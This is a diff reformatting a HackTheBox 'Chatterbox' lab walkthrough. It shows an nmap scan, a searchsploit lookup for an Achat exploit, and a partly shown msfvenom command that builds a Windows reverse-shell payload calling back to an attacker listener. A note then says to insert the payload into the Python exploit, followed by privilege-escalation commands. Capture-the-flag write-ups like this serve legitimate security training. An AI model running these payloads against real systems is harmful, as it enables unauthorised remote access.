@@ -1,22 +1,22 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Chatterbox
-# 11/4/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Medium |
+
 10.10.10.74
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 └─$  nmap -sT -p- --min-rate 5000 --max-retries 1 10.10.10.74    
 PORT    STATE SERVICE
 135/tcp open  msrpc
 139/tcp open  netbios-ssn
 445/tcp open  microsoft-ds
 
-----------------------------------------------------
-# foothold
-----------------------------------------------------
+## Exploitation
 └─$ searchsploit Achat                  
 
 https://www.exploit-db.com/raw/36025
@@ -45,9 +45,7 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.2
 cope buffer from msfvenom and add to python exploit,modify python exploit target ip and run
 you get rev shell
 
-----------------------------------------------------
-# priv esc
-----------------------------------------------------
+## Privilege Escalation
 C:\Users\Administrator\Desktop>net user Alfred
 
 C:\Users\Administrator\Desktop>whoami /priv
